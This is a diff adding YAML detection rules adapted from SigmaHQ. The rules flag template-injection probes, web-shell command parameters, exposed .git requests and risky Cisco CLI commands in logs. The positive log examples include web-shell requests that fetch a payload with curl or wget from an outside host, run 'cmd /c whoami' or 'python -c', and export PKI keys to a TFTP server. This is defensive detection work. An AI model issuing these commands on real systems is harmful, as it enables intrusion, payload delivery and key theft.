+  rationale: >-
+    A parameter value that starts with a template opener ({{ or <%=) is the usual SSTI probe. Search boxes can carry
+    the same text, so it is medium. The three-character keywords '={{', '=${' and '=@(' are below the minimum
+    literal length and are not imported; '=$%7B' is a weak entry.
+  examples:
+    positive:
+      - '203.0.113.53 - - [20/Nov/2026:15:58:00 +0000] "GET /greet?name=%7B%7B7*7%7D%7D HTTP/1.1" 200 12 "-" "-"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:15:59:00 +0000] "GET /greet?name=alice HTTP/1.1" 200 12 "-" "Mozilla/5.0"'
+      - '10.0.3.8 - - [20/Nov/2026:16:00:00 +0000] "GET /static/%7Bhash%7D.js HTTP/1.1" 404 0 "-" "Mozilla/5.0"'
+
+- id: mention.sigma_ssti_dollar_brace
+  title: Encoded dollar-brace in a parameter (Sigma "Server Side Template Injection Strings")
+  match:
+    literal: ['=$%7B']
+  case_sensitive: false
+  strength: weak
+  attack: [T1190]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Server Side Template Injection Strings (Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_ssti_in_access_logs.yml
+    license: DRL-1.1
+    upstream_id: ada3bc4f-f0fd-42b9-ba91-e105e8af7342
+  rationale: >-
+    '${' opens EL, FreeMarker and Log4j expressions, but it also appears in shell-like configuration values and
+    templated links, so it is a weak candidate.
+  examples:
+    positive:
+      - '203.0.113.53 - - [20/Nov/2026:16:01:00 +0000] "GET /search?q=$%7B7*7%7D HTTP/1.1" 200 12 "-" "-"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:16:02:00 +0000] "GET /search?q=price%20%2410 HTTP/1.1" 200 12 "-" "Mozilla/5.0"'
+      - '10.0.3.8 - - [20/Nov/2026:16:03:00 +0000] "GET /a?b=%7Bc%7D HTTP/1.1" 200 12 "-" "Mozilla/5.0"'
+
+- id: mention.sigma_webshell_query_commands
+  title: 'Windows commands as URL parameter values (Sigma "Windows Webshell Strings")'
+  match:
+    literal:
+      - '=whoami'
+      - '=net%20user'
+      - '=net+user'
+      - '=net%2Buser'
+      - '=cmd%20/c%'
+      - '=cmd+/c+'
+      - '=cmd%2B/c%'
+      - '=cmd%20/r%'
+      - '=cmd+/r+'
+      - '=cmd%2B/r%'
+      - '=cmd%20/k%'
+      - '=cmd+/k+'
+      - '=cmd%2B/k%'
+      - '=powershell%'
+      - '=powershell+'
+      - '=tasklist%'
+      - '=tasklist+'
+      - '=wmic%'
+      - '=wmic+'
+      - '=ipconfig'
+      - '=certutil'
+      - '=copy%20%5C%5C'
+      - '=dsquery%'
+      - '=dsquery+'
+      - '=nltest%'
+      - '=nltest+'
+  case_sensitive: false
+  strength: medium
+  attack: [T1505.003]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Windows Webshell Strings (Florian Roth, Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_win_webshells_in_access_logs.yml
+    license: DRL-1.1
+    upstream_id: 7ff9db12-1b94-4a79-ba68-a2402c5d6729
+  rationale: >-
+    A query parameter whose value starts with a Windows recon or execution command is how operators drive web shells
+    over GET. Internet scanners probe the same way and wikis about OS commands can match, so it is medium; the
+    response code and whether the script exists decide it. A search for a phrase that starts with one of these
+    commands ('?q=net+user+guide') matches too; that is the rule's documented false positive. The rule's GET-method
+    condition cannot be expressed.
+  examples:
+    positive:
+      - '203.0.113.54 - - [20/Nov/2026:16:04:00 +0000] "GET /aspnet_client/system_web/s.aspx?c=cmd+/c+whoami HTTP/1.1" 200 41 "-" "-"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:16:05:00 +0000] "GET /search?q=network+users HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+      - '10.0.3.8 - - [20/Nov/2026:16:06:00 +0000] "GET /reports?type=cmdb HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+
+- id: mention.sigma_webshell_query_generic
+  title: Generic tool names as URL parameters (Sigma "Windows Webshell Strings", noisy keywords)
+  match:
+    literal:
+      - '=ssh%'
+      - '=ssh+'
+      - '=python%'
+      - '=python+'
+      - '=python3%'
+      - '=python3+'
+  case_sensitive: false
+  strength: weak
+  attack: [T1505.003]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Windows Webshell Strings (Florian Roth, Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_win_webshells_in_access_logs.yml
+    license: DRL-1.1
+    upstream_id: 7ff9db12-1b94-4a79-ba68-a2402c5d6729
+  rationale: >-
+    ssh and python followed by an argument are also ordinary search terms ('python+tutorial'), so these
+    keywords are weak candidates.
+  examples:
+    positive:
+      - '203.0.113.54 - - [20/Nov/2026:16:07:00 +0000] "GET /up/x.php?cmd=python+-c+import+os HTTP/1.1" 200 0 "-" "-"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:16:08:00 +0000] "GET /search?q=python HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+      - '10.0.3.8 - - [20/Nov/2026:16:09:00 +0000] "GET /kb?topic=sshd_config HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+
+- id: mention.sigma_webshell_query_python_c
+  title: python -c as a URL parameter value (Sigma "Windows Webshell Strings")
+  match:
+    anchored: '=python[0-9.]{0,4}(?:%20|\+)-c(?:%20|\+)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1505.003, T1059.006]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Windows Webshell Strings (Florian Roth, Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_win_webshells_in_access_logs.yml
+    license: DRL-1.1
+    upstream_id: 7ff9db12-1b94-4a79-ba68-a2402c5d6729
+  rationale: >-
+    The rule's '=python+' keyword narrowed to a value that continues with -c: inline Python code passed to a web
+    shell. Searches rarely contain 'python -c', so it is medium.
+  examples:
+    positive:
+      - '203.0.113.54 - - [20/Nov/2026:16:07:03 +0000] "GET /up/x.php?cmd=python3+-c+import+os HTTP/1.1" 200 0 "-" "-"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:16:07:04 +0000] "GET /search?q=python+tutorial HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+      - '10.0.3.8 - - [20/Nov/2026:16:07:05 +0000] "GET /kb?topic=python+-+classes HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+
+- id: mention.sigma_webshell_query_curl_url
+  title: curl with a URL as a URL parameter value (Sigma "Windows Webshell Strings")
+  match:
+    anchored: '=curl(?:%20|\+)[^&\s"]{0,60}(?:https?|ftp)(?::|%3A)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1505.003, T1105]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Windows Webshell Strings (Florian Roth, Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_win_webshells_in_access_logs.yml
+    license: DRL-1.1
+    upstream_id: 7ff9db12-1b94-4a79-ba68-a2402c5d6729
+  rationale: >-
+    The rule's '=curl+' and '=curl%' keywords narrowed to a value that continues with a URL: a web shell told to
+    fetch a payload. Searches for the tool name rarely contain a full URL, so it is medium.
+  examples:
+    positive:
+      - '203.0.113.54 - - [20/Nov/2026:16:07:00 +0000] "GET /up/x.php?cmd=curl+http://203.0.113.54/k HTTP/1.1" 200 0 "-" "-"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:16:07:01 +0000] "GET /search?q=curl+tutorial HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+      - '10.0.3.8 - - [20/Nov/2026:16:07:02 +0000] "GET /kb?topic=curl%20options HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+
+- id: mention.sigma_webshell_query_wget_url
+  title: wget with a URL as a URL parameter value (Sigma "Windows Webshell Strings")
+  match:
+    anchored: '=wget(?:%20|\+)[^&\s"]{0,60}(?:https?|ftp)(?::|%3A)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1505.003, T1105]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Windows Webshell Strings (Florian Roth, Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_win_webshells_in_access_logs.yml
+    license: DRL-1.1
+    upstream_id: 7ff9db12-1b94-4a79-ba68-a2402c5d6729
+  rationale: >-
+    The rule's '=wget+' and '=wget%' keywords narrowed to a value that continues with a URL: a web shell told to
+    fetch a payload. Searches for the tool name rarely contain a full URL, so it is medium.
+  examples:
+    positive:
+      - '203.0.113.54 - - [20/Nov/2026:16:07:00 +0000] "GET /up/x.php?cmd=wget+http://203.0.113.54/k HTTP/1.1" 200 0 "-" "-"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:16:07:01 +0000] "GET /search?q=wget+tutorial HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+      - '10.0.3.8 - - [20/Nov/2026:16:07:02 +0000] "GET /kb?topic=wget%20options HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+
+- id: mention.sigma_git_internals_request
+  title: 'GET request line for .git internals (narrow form of Sigma "Source Code Enumeration Detection by Keyword")'
+  match:
+    anchored: 'GET /[^ \n]{0,200}\.git/(?:config|HEAD|index|logs/HEAD|ORIG_HEAD|packed-refs)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1595.003]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Source Code Enumeration Detection by Keyword (James Ahearn)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_source_code_enumeration.yml
+    license: DRL-1.1
+    upstream_id: 953d460b-f810-420a-97a2-cfca4c98e602
+  rationale: >-
+    The upstream keyword is just '.git/', which matches every CI and deployment log. It is narrowed to an HTTP GET for
+    repository internals, the request a source-code dumper makes against an exposed .git directory. Scanners make it
+    constantly against internet-facing servers, so it is medium.
+  examples:
+    positive:
+      - '203.0.113.55 - - [20/Nov/2026:16:10:00 +0000] "GET /.git/config HTTP/1.1" 200 312 "-" "Mozilla/5.0"'
+    negative:
+      - 'Nov 20 16:11:00 ci01 runner[700]: Cloning into /builds/app/.git/ ... done'
+      - '10.0.3.8 - - [20/Nov/2026:16:12:00 +0000] "GET /docs/git/config.html HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+
+- id: mention.sigma_cisco_clear_logs
+  title: 'Cisco ''clear logging'' or ''clear archive'' command text (Sigma "Cisco Clear Logs")'
+  match:
+    literal: ['clear logging', 'clear archive']
+  case_sensitive: false
+  strength: medium
+  attack: [T1685]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Cisco Clear Logs (Austin Clark)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/network/cisco/aaa/cisco_cli_clear_logs.yml
+    license: DRL-1.1
+    upstream_id: ceb407f6-8277-439b-951f-e4210e3ed956
+  rationale: >-
+    In AAA command accounting, clearing the local log buffer or configuration archive removes evidence on the device.
+    Administrators sometimes clear buffers while troubleshooting, so it is medium.
+  examples:
+    positive:
+      - 'Nov 20 16:13:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop task_id=77 service=shell cmd=clear logging <cr>'
+    negative:
+      - 'Nov 20 16:14:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop task_id=78 service=shell cmd=show logging <cr>'
+      - 'Nov 20 16:15:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop task_id=79 service=shell cmd=clear counters <cr>'
+
+- id: mention.sigma_cisco_pki_export
+  title: Cisco PKI key export (Sigma "Cisco Crypto Commands")
+  match:
+    literal: ['crypto pki export']
+  case_sensitive: false
+  strength: medium
+  attack: [T1552.004]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Cisco Crypto Commands (Austin Clark)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/network/cisco/aaa/cisco_cli_crypto_actions.yml
+    license: DRL-1.1
+    upstream_id: 1f978c6a-4415-47fb-aca5-736a44d7ca3d
+  rationale: >-
+    Exporting a trustpoint's keys and certificates takes private key material off the device. It is rare in normal
+    operations but done during migrations, so it is medium. The import and trustpoint keywords are a weak entry.
+  examples:
+    positive:
+      - 'Nov 20 16:16:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop cmd=crypto pki export TP-SELF pkcs12 tftp://203.0.113.56/k.p12 password ***** <cr>'
+    negative:
+      - 'Nov 20 16:17:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop cmd=show crypto pki certificates <cr>'
+      - 'Nov 20 16:18:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop cmd=crypto key generate rsa modulus 2048 <cr>'
+
+- id: mention.sigma_cisco_pki_import
+  title: Cisco PKI import or trustpoint change (Sigma "Cisco Crypto Commands")
+  match:
+    literal: ['crypto pki import', 'crypto pki trustpoint']
+  case_sensitive: false
+  strength: weak
+  attack: [T1553.004]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Cisco Crypto Commands (Austin Clark)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/network/cisco/aaa/cisco_cli_crypto_actions.yml
+    license: DRL-1.1
+    upstream_id: 1f978c6a-4415-47fb-aca5-736a44d7ca3d
+  rationale: >-
+    Importing certificates or defining a trustpoint can plant a trusted root, but certificate renewals do exactly the
+    same, and the read-only 'show crypto pki trustpoints' contains the keyword, so it is a weak candidate.
+  examples:
+    positive:
+      - 'Nov 20 16:19:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop cmd=crypto pki trustpoint EVIL-CA <cr>'
+    negative:
+      - 'Nov 20 16:20:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop cmd=show crypto pki certificates <cr>'
+      - 'Nov 20 16:21:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop cmd=write memory <cr>'
+
+- id: mention.sigma_cisco_aaa_disabled
+  title: 'Cisco no aaa new-model command text (Sigma "Cisco Disabling Logging")'
+  match:
+    literal: ['no aaa new-model']
+  case_sensitive: false
+  strength: medium
+  attack: [T1685, T1556]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Cisco Disabling Logging (Austin Clark)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/network/cisco/aaa/cisco_cli_disable_logging.yml
+    license: DRL-1.1
+    upstream_id: 9e8f6035-88bf-4a63-96b6-b17c0508257e
+  rationale: >-
+    Removing the AAA model turns off centralized authentication and accounting on the device. Lab rebuilds do it, so
+    it is medium. The rule's 'no logging' keyword matches too much ordinary text to import.
+  examples:
+    positive:
+      - 'Nov 20 16:22:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:no aaa new-model'
+    negative:
+      - 'Nov 20 16:23:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:aaa new-model'
+      - 'Nov 20 16:24:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:aaa authentication login default group tacacs+ local'
+
+- id: mention.sigma_cisco_show_history
+  title: 'Cisco show history command text (Sigma "Cisco Show Commands Input")'
+  match:
+    literal: ['show history']
+  case_sensitive: false
+  strength: weak
+  attack: [T1552.003]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Cisco Show Commands Input (Austin Clark)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/network/cisco/aaa/cisco_cli_input_capture.yml
+    license: DRL-1.1
+    upstream_id: b094d9fb-b1ad-4650-9f1a-fb7be9f1d34b
+  rationale: >-
+    Reading the command history can reveal credentials typed by other administrators, but operators read their own
+    history all the time, so it is a weak candidate. 'show logging' is not imported: it is a routine command.
+  examples:
+    positive:
+      - 'Nov 20 16:25:00 tacacs01 tac_plus[900]: 10.0.0.1 guest tty2 203.0.113.57 stop cmd=show history all <cr>'
+    negative:
+      - 'Nov 20 16:26:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop cmd=show version <cr>'
+      - 'Nov 20 16:27:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop cmd=show interfaces status <cr>'
+
+- id: mention.sigma_cisco_packet_capture
+  title: 'Cisco monitor capture point command text (Sigma "Cisco Sniffing")'
+  match:
+    literal: ['monitor capture point']
+  case_sensitive: false
+  strength: medium
+  attack: [T1040]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Cisco Sniffing (Austin Clark)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/network/cisco/aaa/cisco_cli_net_sniff.yml
+    license: DRL-1.1
+    upstream_id: b9e1f193-d236-4451-aaae-2f3d2102120d
+  rationale: >-
+    Defining an embedded capture point records traffic on the device, a way to collect credentials in transit.
+    Network teams use it for troubleshooting, so it is medium. The SPAN keywords are a weak entry.
+  examples:
+    positive:
+      - 'Nov 20 16:28:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:monitor capture point ip cef CAP gi0/1 both'
+    negative:
+      - 'Nov 20 16:29:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:show monitor session all'
+      - 'Nov 20 16:30:00 rtr01 %LINK-3-UPDOWN: Interface GigabitEthernet0/1, changed state to up'
+
+- id: mention.sigma_cisco_span
+  title: 'Catalyst ''set span'' or ''set rspan'' command text (Sigma "Cisco Sniffing")'
+  match:
+    literal: ['set span', 'set rspan']
+  case_sensitive: false
+  strength: weak
+  attack: [T1040]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Cisco Sniffing (Austin Clark)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/network/cisco/aaa/cisco_cli_net_sniff.yml
+    license: DRL-1.1
+    upstream_id: b9e1f193-d236-4451-aaae-2f3d2102120d
+  rationale: >-
+    Mirroring ports with SPAN copies traffic to a collector; security monitoring sensors are fed exactly this way, so
+    it is a weak candidate.
+  examples:
+    positive:
+      - 'Nov 20 16:31:00 tacacs01 tac_plus[900]: 10.0.0.2 netadmin tty1 10.0.9.9 stop cmd=set span 3/1 3/24 both <cr>'
+    negative:
+      - 'Nov 20 16:32:00 tacacs01 tac_plus[900]: 10.0.0.2 netadmin tty1 10.0.9.9 stop cmd=show span <cr>'
+      - 'Nov 20 16:33:00 tacacs01 tac_plus[900]: 10.0.0.2 netadmin tty1 10.0.9.9 stop cmd=set vlan 10 3/1 <cr>'
+
+- id: mention.sigma_cisco_config_register
+  title: 'Cisco config-register 0x2142 or 0x2100 command text (Sigma "Cisco Denial of Service")'
+  match:
+    literal: ['config-register 0x2100', 'config-register 0x2142']
+  case_sensitive: false
+  strength: medium
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Cisco Denial of Service (Austin Clark)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/network/cisco/aaa/cisco_cli_dos.yml
+    license: DRL-1.1
+    upstream_id: d94a35f0-7a29-45f6-90a0-80df6159967c
+  rationale: >-
+    0x2142 makes the router ignore its startup configuration (the password-recovery path) and 0x2100 boots into
+    ROMMON; both take the device out of its intended configuration. Password recovery by the owner is the benign
+    case, so it is medium. 'shutdown' is not imported: it is an everyday interface command.
+  examples:
+    positive:
+      - 'Nov 20 16:34:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:config-register 0x2142'
+    negative:
+      - 'Nov 20 16:35:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:config-register 0x2102'
+      - 'Nov 20 16:36:00 rtr01 %SYS-5-RELOAD: Reload requested by netadmin on vty0. Reload Reason: Reload Command.'
+
+- id: mention.sigma_cisco_dot1x_disabled
+  title: '802.1X ''force-authorized'' or port-control removal command text (Sigma "Cisco Dot1x Disabled")'
+  match:
+    literal:
+      - 'access-session port-control force-authorized'
+      - 'authentication port-control force-authorized'
+      - 'dot1x port-control force-authorized'
+      - 'no access-session port-control'
+      - 'no authentication port-control'
+      - 'no dot1x port-control'
+      - 'no dot1x system-auth-control'
+  case_sensitive: false
+  strength: medium
+  attack: [T1599]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Cisco Dot1x Disabled (Luc Génaux)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/network/cisco/aaa/cisco_cli_dot1x_disabled.yml
+    license: DRL-1.1
+    upstream_id: ef0ff092-a24a-4fbc-beea-06c08d53e085
+  rationale: >-
+    Forcing a port authorized or removing 802.1X lets any device onto the access network without network access
+    control. Technicians do it for printers or troubleshooting, so it is medium.
+  examples:
+    positive:
+      - 'Nov 20 16:37:00 sw01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:authentication port-control force-authorized'
+    negative:
+      - 'Nov 20 16:38:00 sw01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:authentication port-control auto'
+      - 'Nov 20 16:39:00 sw01 %DOT1X-5-SUCCESS: Authentication successful for client (0011.2233.4455) on Interface Gi1/0/5'
+
+- id: mention.sigma_cisco_kron
+  title: 'Cisco kron policy-list or occurrence command text (Sigma "Cisco Modify Configuration")'
+  match:
+    literal: ['kron policy-list', 'kron occurrence']
+  case_sensitive: false
+  strength: medium
+  attack: [T1053]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Cisco Modify Configuration (Austin Clark)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/network/cisco/aaa/cisco_cli_modify_config.yml
+    license: DRL-1.1
+    upstream_id: 671ffc77-50a7-464f-9e3d-9ea2b493b26b
+  rationale: >-
+    kron runs CLI commands on a schedule, a persistence and exfiltration mechanism on IOS (for example periodically
+    copying the configuration off the box). Backups are sometimes scheduled this way, so it is medium. The rule's
+    generic keywords (policy-list, access-list, ip access-group, ntp server) are not imported.
+  examples:
+    positive:
+      - 'Nov 20 16:40:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:kron occurrence BK in 60 recurring'
+    negative:
+      - 'Nov 20 16:41:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:ip access-list extended MGMT'
+      - 'Nov 20 16:42:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:ntp server 10.0.0.1'
+
+- id: mention.sigma_cisco_config_weak
+  title: Cisco web server or archive settings (Sigma "Cisco Modify Configuration", generic keywords)
+  match:
+    literal: ['ip http server', 'ip https server', 'archive maximum']
+  case_sensitive: false
+  strength: weak
+  attack: [T1133]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Cisco Modify Configuration (Austin Clark)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/network/cisco/aaa/cisco_cli_modify_config.yml
+    license: DRL-1.1
+    upstream_id: 671ffc77-50a7-464f-9e3d-9ea2b493b26b
+  rationale: >-
+    Enabling the device web server opens a management surface with a long exploit history, and archive settings
+    affect configuration evidence; both are routine configuration too, and the hardening command 'no ip http server'
+    contains the keyword, so they are weak candidates.
+  examples:
+    positive:
+      - 'Nov 20 16:43:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:ip http server'
+    negative:
+      - 'Nov 20 16:44:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:ip http authentication local'
+      - 'Nov 20 16:45:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:ip ssh version 2'
+
+- id: mention.sigma_cisco_config_dump
+  title: 'Cisco ''show running-config'' or ''show startup-config'' command text (Sigma "Cisco Collect Data")'
+  match:
+    literal: ['show running-config', 'show startup-config', 'show archive config']
+  case_sensitive: false
+  strength: weak
+  attack: [T1602.002]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Cisco Collect Data (Austin Clark)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/network/cisco/aaa/cisco_cli_collect_data.yml
+    license: DRL-1.1
+    upstream_id: cd072b25-a418-4f98-8ebc-5093fb38fe1a
+  rationale: >-
+    Dumping the configuration exposes password hashes, SNMP communities and topology. It is also the most common
+    administrator command, so it is a weak candidate. The rule's 'more' keyword is not imported.
+  examples:
+    positive:
+      - 'Nov 20 16:46:00 tacacs01 tac_plus[900]: 10.0.0.1 guest tty2 203.0.113.57 stop cmd=show running-config <cr>'
+    negative:
+      - 'Nov 20 16:47:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop cmd=show ip route <cr>'
+      - 'Nov 20 16:48:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop cmd=copy running-config startup-config <cr>'
